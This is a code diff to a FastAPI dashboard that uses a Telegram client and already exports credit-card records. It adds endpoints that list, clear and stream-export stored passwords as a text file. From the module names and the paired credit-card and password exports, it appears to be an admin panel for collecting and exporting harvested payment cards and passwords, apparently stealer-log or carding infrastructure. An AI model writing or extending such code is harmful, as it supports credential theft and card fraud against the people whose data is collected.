@@ -11,7 +11,7 @@ from pathlib import Path
 from urllib.parse import quote_plus
 from typing import Any
 from fastapi import FastAPI, Form, HTTPException, Request
-from fastapi.responses import FileResponse, RedirectResponse, Response
+from fastapi.responses import FileResponse, RedirectResponse, Response, StreamingResponse
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
 from starlette.middleware.sessions import SessionMiddleware
@@ -25,6 +25,7 @@ from telethon.errors import (
 )
 from secure_logging import recent_activity_logs
 from parse_credit_cards import format_credit_card_line
+from parse_passwords import format_password_line
 
 LOG = logging.getLogger('dashboard')
 SESSION_MAX_AGE = 12 * 60 * 60
@@ -578,6 +579,39 @@ class Dashboard:
                 content,
                 media_type='text/plain',
                 headers={'Content-Disposition': 'attachment; filename=credit-cards.txt'},
+            )
+
+        @self.app.get('/file-passwords')
+        async def get_file_passwords(request: Request, limit: int = 1000):
+            self._require(request)
+            limit = max(1, min(int(limit), 5000))
+            records, total = await asyncio.to_thread(self.db.get_passwords, limit)
+            for record in records:
+                record['line'] = format_password_line(record)
+            return {'total': total, 'showing': len(records), 'passwords': records}
+
+        @self.app.post('/file-passwords/clear-all')
+        async def clear_file_passwords(request: Request, csrf: str = Form(...)):
+            self._require_post(request, csrf)
+            count = await asyncio.to_thread(self.db.clear_all_passwords)
+            return RedirectResponse(f'/?notice=Deleted+{count}+passwords', 303)
+
+        @self.app.get('/file-passwords/export')
+        async def export_file_passwords(request: Request):
+            self._require(request)
+
+            def generate():
+                yielded = False
+                for record in self.db.iter_all_passwords():
+                    yielded = True
+                    yield format_password_line(record) + '\n'
+                if not yielded:
+                    yield ''
+
+            return StreamingResponse(
+                generate(),
+                media_type='text/plain',
+                headers={'Content-Disposition': 'attachment; filename=passwords.txt'},
             )
 
         @self.app.get('/session-regenerate')
